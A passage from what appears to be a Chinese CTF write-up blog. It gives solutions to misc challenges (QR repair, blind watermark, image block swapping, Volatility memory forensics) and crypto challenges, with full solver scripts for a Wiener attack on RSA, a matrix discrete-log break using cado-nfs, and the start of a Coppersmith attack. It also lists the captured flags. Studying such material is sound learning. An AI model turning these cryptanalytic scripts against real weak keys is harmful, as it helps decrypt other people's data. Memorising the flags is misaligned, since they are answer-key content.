alt="img"></p><p>foremost得到png和jpg，png是一个涂改的二维码，用ps把每个颜色不为纯黑（000000）的涂白，即恢复图片</p><p>得到第一段flag</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908249.png" alt="img"></p><p>jpg尝试之后发现是盲水印，下载工具解即可</p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908409.png" alt="image-20241220185543278" style="zoom:200%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">014c6e74-0c4a-48fa-8b33-ced16f847e39<br></code></pre></td></tr></table></figure><h3 id="4-4"><a href="#4-4" class="headerlink" title="4-4"></a>4-4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">split_and_swap</span>(<span class="hljs-params">image_path, output_path</span>):<br>    <span class="hljs-comment"># 读取图片</span><br>    img = Image.<span class="hljs-built_in">open</span>(image_path)<br>    img = img.convert(<span class="hljs-string">&#x27;RGB&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 获取图片尺寸</span><br>    width, height = img.size<br>    <br>    <span class="hljs-comment"># 确保图片尺寸可以被8整除</span><br>    <span class="hljs-keyword">if</span> width % <span class="hljs-number">8</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> height % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;图片尺寸必须可以被8整除&quot;</span>)<br>    <br>    <span class="hljs-comment"># 创建一个新的空白图片用于存储结果</span><br>    new_img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    new_img_array = np.array(new_img)<br>    <br>    <span class="hljs-comment"># 遍历每一个8x8的格子</span><br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height, <span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width, <span class="hljs-number">8</span>):<br>            <span class="hljs-comment"># 提取8x8格子的图像数据</span><br>            block = np.array(img)[y:y+<span class="hljs-number">8</span>, x:x+<span class="hljs-number">8</span>]<br>            <br>            <span class="hljs-comment"># 将8x8格子分为四份</span><br>            h, w, _ = block.shape<br>            half_h, half_w = h // <span class="hljs-number">2</span>, w // <span class="hljs-number">2</span><br>            <br>            <span class="hljs-comment"># 四份分别为：</span><br>            part1 = block[:half_h, :half_w]<br>            part2 = block[:half_h, half_w:]<br>            part3 = block[half_h:, :half_w]<br>            part4 = block[half_h:, half_w:]<br>            <br>            <span class="hljs-comment"># 交换第2份和第3份</span><br>            swapped_block = np.zeros_like(block)<br>            swapped_block[:half_h, :half_w] = part1<br>            swapped_block[:half_h, half_w:] = part3<br>            swapped_block[half_h:, :half_w] = part2<br>            swapped_block[half_h:, half_w:] = part4<br>            <br>            <span class="hljs-comment"># 将交换后的格子放回新图片对应位置</span><br>            new_img_array[y:y+<span class="hljs-number">8</span>, x:x+<span class="hljs-number">8</span>] = swapped_block<br>    <br>    <span class="hljs-comment"># 将数组转换回图片</span><br>    result_img = Image.fromarray(new_img_array)<br>    <br>    <span class="hljs-comment"># 保存新的图片</span><br>    result_img.save(output_path)<br><br><span class="hljs-comment"># 使用示例</span><br>split_and_swap(<span class="hljs-string">&#x27;PixMatrix.jpg&#x27;</span>, <span class="hljs-string">&#x27;output.jpg&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908216.png" alt="img"></p><h3 id="4-5"><a href="#4-5" class="headerlink" title="4-5"></a>4-5</h3><p>下载附件发现是raw文件，明显需要使用volatility</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908709.png" alt="img"></p><p>vol.exe -f E:\STUDY\ctf\lzctf\hcb\马赛克的附件2\tempdir\MISC附件\mem\mem.raw imageinfo </p><p>发现关键txt 和flag.zip </p><p>下载附件发现是raw文件，明显需要使用volatility</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908346.png" alt="img"></p><p>vol.exe -f E:\STUDY\ctf\lzctf\hcb\马赛克的附件2\tempdir\MISC附件\mem\mem.raw imageinfo </p><p>发现关键txt 和flag.zip </p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908690.png" alt="img"></p><p>txt如下</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908490.png" alt="img"></p><p>编写脚本恢复zip即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">DASCTF&#123;debef10c-05bb-4ea7-8d01-a5fdf2a246b7&#125;<br></code></pre></td></tr></table></figure><h2 id="Crytro"><a href="#Crytro" class="headerlink" title="Crytro"></a>Crytro</h2><h3 id="5-1"><a href="#5-1" class="headerlink" title="5-1"></a>5-1</h3><p>一眼维纳攻击，直接解了</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908477.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">transform</span>(<span class="hljs-params">x,y</span>):       <span class="hljs-comment">#使用辗转相处将分数 x/y 转为连分数的形式</span><br>    res=[]<br>    <span class="hljs-keyword">while</span> y:<br>        res.append(x//y)<br>        x,y=y,x%y<br>    <span class="hljs-keyword">return</span> res<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">continued_fraction</span>(<span class="hljs-params">sub_res</span>):<br>    numerator,denominator=<span class="hljs-number">1</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sub_res[::-<span class="hljs-number">1</span>]:      <span class="hljs-comment">#从sublist的后面往前循环</span><br>        denominator,numerator=numerator,i*numerator+denominator<br>    <span class="hljs-keyword">return</span> denominator,numerator   <span class="hljs-comment">#得到渐进分数的分母和分子，并返回</span><br><br>    <br><span class="hljs-comment">#求解每个渐进分数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_fraction</span>(<span class="hljs-params">x,y</span>):<br>    res=transform(x,y)<br>    res=<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(continued_fraction,(res[<span class="hljs-number">0</span>:i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(res)))))  <span class="hljs-comment">#将连分数的结果逐一截取以求渐进分数</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pq</span>(<span class="hljs-params">a,b,c</span>):      <span class="hljs-comment">#由p+q和pq的值通过维达定理来求解p和q</span><br>    par=gmpy2.isqrt(b*b-<span class="hljs-number">4</span>*a*c)   <span class="hljs-comment">#由上述可得，开根号一定是整数，因为有解</span><br>    x1,x2=(-b+par)//(<span class="hljs-number">2</span>*a),(-b-par)//(<span class="hljs-number">2</span>*a)<br>    <span class="hljs-keyword">return</span> x1,x2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e,n</span>):<br>    <span class="hljs-keyword">for</span> (d,k) <span class="hljs-keyword">in</span> sub_fraction(e,n):  <span class="hljs-comment">#用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span><br>        <span class="hljs-keyword">if</span> k==<span class="hljs-number">0</span>:                     <span class="hljs-comment">#可能会出现连分数的第一个为0的情况，排除</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e*d-<span class="hljs-number">1</span>)%k!=<span class="hljs-number">0</span>:             <span class="hljs-comment">#ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span><br>            <span class="hljs-keyword">continue</span><br>        <br>        phi=(e*d-<span class="hljs-number">1</span>)//k               <span class="hljs-comment">#这个结果就是 φ(n)</span><br>        px,qy=get_pq(<span class="hljs-number">1</span>,n-phi+<span class="hljs-number">1</span>,n)<br>        <span class="hljs-keyword">if</span> px*qy==n:<br>            p,q=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(px)),<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(qy))     <span class="hljs-comment">#可能会得到两个负数，负负得正未尝不会出现</span><br>            d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))     <span class="hljs-comment">#求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span><br>            <span class="hljs-keyword">return</span> d<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该方法不适用&quot;</span>)<br><br>n = <span class="hljs-number">114566998957451783636756389276471274690612644037126335470456866443567982817002189902938330449132444558501556339080521014838959058380963759366933946623103869574657553262938223064086322963492884606713973124514306815995276393344755433548846003574038937940253826360659447735554684257197194046341849089254659225497</span><br>e = <span class="hljs-number">35489734227210930185586918984451799765619374486784192218215354633053183935617953856556709715097294481614236703293033675674496036691242573294182072757562322996800390363453350727372642264982749305833933966045097125311467413670410802534093354414115267442785896373815076066721029449240889291057288090241124904705</span><br>c = <span class="hljs-number">60503455347700500866544596012233537789678841391057706123172519773588895502922586197178148979273264437566411675346207472455036341903878112074983509557751805365618433536738111588239911292341288514123006967218545943520736254346030465088445419278775539026233686559207400401082452551955780877227801939191694370380</span><br>d=wienerAttack(e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d=&quot;</span>,d)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-comment">#print(m)</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#DASCTF&#123;e694f0b4e9556021d1bc9e8deedba575&#125;</span><br></code></pre></td></tr></table></figure><h3 id="5-2"><a href="#5-2" class="headerlink" title="5-2"></a>5-2</h3><p>第二题参考了dexterjie师傅的博客，调一调代码就出了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">pt, G, A, T, S, p</span>):<br>    s = randint(<span class="hljs-number">0</span>,p-<span class="hljs-number">1</span>)<br>    D = G^s<br>    E = A*T*A<br>    F = D*E*D<br>    K = <span class="hljs-built_in">list</span>(D*S*D)<br>    key = <span class="hljs-built_in">sum</span>(K[<span class="hljs-number">0</span>])+<span class="hljs-built_in">sum</span>(K[<span class="hljs-number">1</span>])+<span class="hljs-built_in">sum</span>(K[<span class="hljs-number">2</span>])<br>    mask = <span class="hljs-built_in">int</span>(sha256(<span class="hljs-built_in">str</span>(key).encode()).hexdigest(),<span class="hljs-number">16</span>)<br>    ct = pt ^^ mask<br>    <span class="hljs-keyword">return</span> ct, F<br><br>p =  <span class="hljs-number">72887242108660141996862343556330151015969690949835567252527194788428065480383</span><br>Fp2.&lt;i&gt; = GF(p^<span class="hljs-number">2</span>, modulus=x^<span class="hljs-number">2</span>+<span class="hljs-number">1</span>)<br>M = MatrixSpace(Fp2, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>)<br><br>pk =  ([(<span class="hljs-number">17721183402259872020800275954210023274983052570120081248291897425608931477093</span>*i + <span class="hljs-number">32398110280895896734010284949974832063887503132353681078977206899204202173789</span>, <span class="hljs-number">54531634495057046991515273558305428867102201405617856305008554208336946545276</span>*i + <span class="hljs-number">53559176432820530464958340934397135653021175198597495321065224929188410347695</span>, <span class="hljs-number">27719945502856754481236098196014205483081586087367078493933408080194499938927</span>*i + <span class="hljs-number">1450628736387393873166171805424299538505476789523674611289973478290718453200</span>), (<span class="hljs-number">57242423786686483363839647362581564383925732392730073374546590355998555747077</span>*i + <span class="hljs-number">573726326354574516128249317235875704460857319673337707555095009277545125755</span>, <span class="hljs-number">33631043256657770245013631632455702904903259491780484310654749784948198388976</span>*i + <span class="hljs-number">17344746653834202604930860577508757708688427949046279718508635007113840369042</span>, <span class="hljs-number">37771390186920740637371383242878514021347606565375600086363978842439775164973</span>*i + <span class="hljs-number">60264754185911116825495147907207494752330900415794996812483089251259003404228</span>), (<span class="hljs-number">1163730453993018743008743150834548760986076138562570206571825145859591284352</span>*i + <span class="hljs-number">69245390362211526197537288211735612650619880945856387683074182933575799994162</span>, <span class="hljs-number">11137807706588795799057940108843238078078690609437386007163034291855328303661</span>*i + <span class="hljs-number">50795522649623533714787572047531722836395032085224035511036953078383612475598</span>, <span class="hljs-number">14354786571703727534706086386589187674076604263117377684131521866407943036307</span>*i + <span class="hljs-number">63028649680815097939155846824928638616844025040257105384123424769274942520895</span>)], [(<span class="hljs-number">22137116252880790433838296157765927318220905592359967466680754349755815464341</span>*i + <span class="hljs-number">35503968364379821899511866562472775961434113516937033217642581531414863539290</span>, <span class="hljs-number">38346074307552448152239080224505166810289185210503265380269711384969731945517</span>*i + <span class="hljs-number">9333819647786551924409858116441570177115099865486742684028611902450000042407</span>, <span class="hljs-number">24608192510515673607042276468532809071945836783394960695059783085937608049755</span>*i + <span class="hljs-number">27099766371861599260580052331632986107092105438254563604629919595057370886149</span>), (<span class="hljs-number">57539731529782952718529369617033412770127782205874818027724894673104814770991</span>*i + <span class="hljs-number">12431864123786174601413168140961685219607645783666490625760143190724674574386</span>, <span class="hljs-number">33510082449726132893492104159133966168598115972734064630878005553829725389082</span>*i + <span class="hljs-number">30594711977745700371548334707069524826346332947574826081979927125841475148328</span>, <span class="hljs-number">8911862104171403632946802970568635607253840071000107875759139060453368618583</span>*i + <span class="hljs-number">51594672749496705581452789883241278156858476777167382827032876227546058970732</span>), (<span class="hljs-number">58105830161247358431125768499050987088161417325586965601350797391396603985470</span>*i + <span class="hljs-number">10949064084676782939947256128733523229613253182051362970560478801614590446300</span>, <span class="hljs-number">6665352489343222248969975791152178151760060704226637217535985452272551528693</span>*i + <span class="hljs-number">16163109497937280055564868323730465088174193174761590036929535644203224067166</span>, <span class="hljs-number">26147088265849488467397913386934580340556987670869413865359802108333761377560</span>*i + <span class="hljs-number">14170094609019059182842713618319151553137248441974849089555832123638494739417</span>)], [(<span class="hljs-number">60066006389024369318961505483331049048095679333675437984483948643792214278503</span>*i + <span class="hljs-number">67617085525047580942273623886038114942547589259839196477555874755427651308048</span>, <span class="hljs-number">38692305959834079988532869421062338838072016075793686080934562521314366274998</span>*i + <span class="hljs-number">21104829450473981189549299039898127784065322316764325995863199136802573514</span>, <span class="hljs-number">7207625628360021282792621977024027446511231977201394776410095364976996279450</span>*i + <span class="hljs-number">23039079766688651678553952766794875180844089420934577132338235904018762773928</span>), (<span class="hljs-number">10808368042897084491009063074724200907600038030639153659288985642861405920614</span>*i + <span class="hljs-number">33955795465220353002933680692690511153845418737513482128237117905262919879043</span>, <span class="hljs-number">21645210772494061734726430463955231707074915293749580279327741388687068110310</span>*i + <span class="hljs-number">62225984739450865202997071369617271241348810092608626482294704825641320606694</span>, <span class="hljs-number">14572118842071162051223076904993643512402905544627821044103215186921277812496</span>*i + <span class="hljs-number">63504547636870837320642724540312613748726280369811190421219651308407770510674</span>), (<span class="hljs-number">6529211642735966744323364626486352288002532267939478445216264742350974653419</span>*i + <span class="hljs-number">43426895500365913698127867498420593427453574994051597107529725996420257433857</span>, <span class="hljs-number">66636149494607064863031794353485502915121295051850619450321561966293398587284</span>*i + <span class="hljs-number">51049172134567530748763269555600518661288880531459625871071308764595168859033</span>, <span class="hljs-number">42297258788816007263333796194491196601979606573843177791726417124128570106777</span>*i + <span class="hljs-number">45527674821983322767637713856131638914194577467349514130179266972864796164733</span>)], [(<span class="hljs-number">47645610858583239528541540288030905132801730740336899517917521534427703920375</span>*i + <span class="hljs-number">13272393664089987551368548207128885229248289454405159277755757369580866096516</span>, <span class="hljs-number">60503024931869977830369448001966194434192750710631225090391559259672930497207</span>*i + <span class="hljs-number">22742672333325631628906219543935772962495637869131049729874762344108069789046</span>, <span class="hljs-number">18239371575343144081671835175136676417172797381923442300525086630600561560114</span>*i + <span class="hljs-number">53605095942301227312866863441233162082087535371838738595931070092230378325532</span>), (<span class="hljs-number">49652795839344946948771531270341537200526957150620826334216871981974859849848</span>*i + <span class="hljs-number">72788891932812016325514298655742330969740202920835574638161526839627026310392</span>, <span class="hljs-number">58465406030985457122487065262985150103086610852826560192123766406670919681919</span>*i + <span class="hljs-number">41631921368744416558173670147590406285376603436284660888096365325833457519047</span>, <span class="hljs-number">2867068797023070369258694926242485369317317985428997150826022662547346928319</span>*i + <span class="hljs-number">199536555238705400453079146297641296197748614855192340202929119323998667173</span>), (<span class="hljs-number">19319782936524636558881137449470396788888469756320580071801690941326971557928</span>*i + <span class="hljs-number">34694728896207512382372151140975478616355941017631874070450334268575015485538</span>, <span class="hljs-number">60420266086997924618637147844041161464210208935194926422677077391866663978425</span>*i + <span class="hljs-number">13672363312837218411993834816309940812825734002380106434784905443915361955247</span>, <span class="hljs-number">56317025568717741728727542740124505299029374963112095990350877412868385510001</span>*i + <span class="hljs-number">56960621295573230601502052571104746367180500789238336757504091383665514782189</span>)])<br>F =  [(<span class="hljs-number">36081831373398765496490121898118275331597167308301671911642273861563666664545</span>*i + <span class="hljs-number">20818485079783326431414952124332440995164298376805349071762867760925654560129</span>, <span class="hljs-number">2080527476644284459469754065728582261439110792635520661740429151724797376184</span>*i + <span class="hljs-number">22485923248080983391383279592637691489160934672854638306617785344436031827838</span>, <span class="hljs-number">15544373162545014827602222261755865080947187122261471926061663568794038512828</span>*i + <span class="hljs-number">65994932829738499994169748656063604384011854387402875895186473718226656419067</span>), (<span class="hljs-number">3553534440103543686958858303956716887328727627636404431097647427819509340361</span>*i + <span class="hljs-number">41182149981825439188243414995474733005799065992663037326956422731949977723727</span>, <span class="hljs-number">11444151159046255413538671703716370245288291793592500278345001664024824339590</span>*i + <span class="hljs-number">1802783416049323926195923226865768221398255563865542946492803065162093093803</span>, <span class="hljs-number">15739175840903697568714274177182938758189586472507039731239155962622285528109</span>*i + <span class="hljs-number">38249065906628598713138583591858150126778794837077688369911160900556744463900</span>), (<span class="hljs-number">14364753807737302773559096493138893453118094354943941768609481298414054855231</span>*i + <span class="hljs-number">16290236676179704559365899211744462983770375364688247022596145726641137243214</span>, <span class="hljs-number">3863306473986430132042752882629555431418515741358351198972027547882636615940</span>*i + <span class="hljs-number">1209446834271293681961506708684952401569936830292701272655835127315444154958</span>, <span class="hljs-number">21868026584808712490812183410257662299067350008298604021123682243508255905173</span>*i + <span class="hljs-number">12828201007038003022201361213007595366913298546122923089499182187938898042596</span>)]<br>ct =  <span class="hljs-number">96910798667771988374291172958072220832574586618080134344021393928577220469428</span><br><br>A, T, S, G = [M(ii) <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> pk]<br>F = M(F)<br><br><br><span class="hljs-comment">############################################################### attack</span><br>E = A*T*A<br>detA, detT, detS, detG, detE, detF = A.det(), T.det(), S.det(), G.det(), E.det(), F.det()<br>r = <span class="hljs-number">2244966557637008779362441591080406338119704738381872153797151</span><br><span class="hljs-comment">#R = 80839783875482453208291688688697485912290384775841712705111124172946909733768714734343762988749579725275997021760357500939</span><br><span class="hljs-comment">#r = discrete_log(detG^R, ((detA^(-1)*detT).sqrt())^R, ord=(p^2-1)//R)</span><br><span class="hljs-comment">#s = discrete_log(((detA^(-2)*detT^(-1)*detF).sqrt())^R, detG^R, ord=(p^2-1)//R)</span><br><span class="hljs-comment">#not enough so use cado-nfs</span><br><span class="hljs-keyword">import</span> subprocess<br><br>command = [<br>    <span class="hljs-string">&#x27;./cado-nfs.py&#x27;</span>,<br>    <span class="hljs-string">&#x27;-dlp&#x27;</span>,<br>    <span class="hljs-string">&#x27;-ell&#x27;</span>, <span class="hljs-built_in">str</span>(r),<br>    <span class="hljs-string">&#x27;target=&#x27;</span>+<span class="hljs-built_in">str</span>(t1),<br>    <span class="hljs-built_in">str</span>(p)<br>]<br><span class="hljs-comment">#1541758195020130454925136833461872657607368759409055632195831</span><br><br>command = [<br>    <span class="hljs-string">&#x27;./cado-nfs.py&#x27;</span>,<br>    <span class="hljs-string">&#x27;-dlp&#x27;</span>,<br>    <span class="hljs-string">&#x27;-ell&#x27;</span>, <span class="hljs-built_in">str</span>(r),<br>    <span class="hljs-string">&#x27;target=&#x27;</span>+<span class="hljs-built_in">str</span>(t2),<br>    <span class="hljs-built_in">str</span>(p)<br>]<br><span class="hljs-comment">#780392429787953543532147509264510635118839088869098098140941</span><br><br><span class="hljs-keyword">try</span>:<br>    result = subprocess.run(command, check=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>, capture_output=<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(result.stdout)<br><span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ERROR: <span class="hljs-subst">&#123;e.returncode&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERROR:&quot;</span>, e.stderr)<br><span class="hljs-comment">#t2^s = t1</span><br>Fr = GF(r)<br>s1 = Fr(<span class="hljs-number">1541758195020130454925136833461872657607368759409055632195831</span>)<br>s2 = Fr(<span class="hljs-number">780392429787953543532147509264510635118839088869098098140941</span>)<br>ss = discrete_log(<span class="hljs-built_in">pow</span>(t1, <span class="hljs-number">6</span>*r, p), <span class="hljs-built_in">pow</span>(t2, <span class="hljs-number">6</span>*r, p), operation=<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-built_in">ord</span>=(p-<span class="hljs-number">1</span>)//r)<br>s = crt([<span class="hljs-built_in">int</span>(ss), <span class="hljs-built_in">int</span>(s1/s2)], [(p-<span class="hljs-number">1</span>)//(<span class="hljs-number">6</span>*r), r])<br><br>ss = s<br><span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    s = ss + ii * (p-<span class="hljs-number">1</span>) // <span class="hljs-number">6</span><br>    D = G^<span class="hljs-built_in">int</span>(s)<br>    K = <span class="hljs-built_in">list</span>(D*S*D)<br>    key = <span class="hljs-built_in">sum</span>(K[<span class="hljs-number">0</span>])+<span class="hljs-built_in">sum</span>(K[<span class="hljs-number">1</span>])+<span class="hljs-built_in">sum</span>(K[<span class="hljs-number">2</span>])<br>    mask = <span class="hljs-built_in">int</span>(sha256(<span class="hljs-built_in">str</span>(key).encode()).hexdigest(),<span class="hljs-number">16</span>)<br>    pt = ct ^^ mask<br>    <span class="hljs-keyword">if</span>(D.det()*detE*D.det() == detF):<br>        <span class="hljs-built_in">print</span>(long_to_bytes(pt))<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#QAQ~4_Br0ken_Crypto_Sy5tem~TAT</span><br></code></pre></td></tr></table></figure><h3 id="5-4"><a href="#5-4" class="headerlink" title="5-4"></a>5-4</h3><p>p高位泄露，采用coppersmith分解n，之后解椭圆曲线求m即得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">135133139540786818977969958456509467902948924003478556140490841984247464940261764739984274397650928404945721248284577232814352745333641188749824519153271662051302477973525156608141358709265683759057060630360909926255299541198485901065352661702656282587105799982740927802530997159098015074633017964344230291287</span><br><span class="hljs-comment"># leak_p = 115314121469787984258489158421056136177545051135641551928888818017665807264468</span><br>c = <span 